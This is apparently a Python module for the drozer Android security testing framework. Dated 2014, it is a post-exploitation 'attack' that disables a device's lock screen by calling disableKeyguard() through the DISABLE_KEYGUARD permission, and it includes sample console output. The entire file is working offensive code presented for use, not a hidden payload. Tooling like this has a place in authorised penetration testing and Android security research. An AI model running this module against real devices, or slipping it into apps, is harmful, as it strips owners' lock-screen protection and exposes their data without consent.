from drozer.modules import Module, common

class DisableLockScreen(Module, common.ClassLoader):

    name = "Disable the device's lock screen using DISABLE_KEYGUARD permission"
    description = """
    This attack uses the DISABLE_KEYGUARD permission to disable the lock screen. KeyguardManager.KeyguardLock was supposedly deprecated in API 13 but disableKeyguard() still works on Android 4.4.2

    Vulnerable:
      * Android - all versions 
    """
    examples = """
    dz> run post.perform.disablelockscreen
    [*] Attemping to disableKeyguard()
    [*] Done. Check device.
    """
    author = "Tyrone (@mwrlabs)"
    date = "2014-11-02"
    license = "BSD (3 clause)"
    path = ["post", "perform"]
    permissions = ["com.mwr.dz.permissions.GET_CONTEXT", "android.permission.DISABLE_KEYGUARD"]
    
    def execute(self, arguments):
        con = self.getContext()
        kgl = con.getSystemService("keyguard")

        self.stdout.write("[*] Attempting to disableKeyguard()\n")
        kgl.newKeyguardLock("dz").disableKeyguard()
        self.stdout.write("[*] Done. Check device.\n")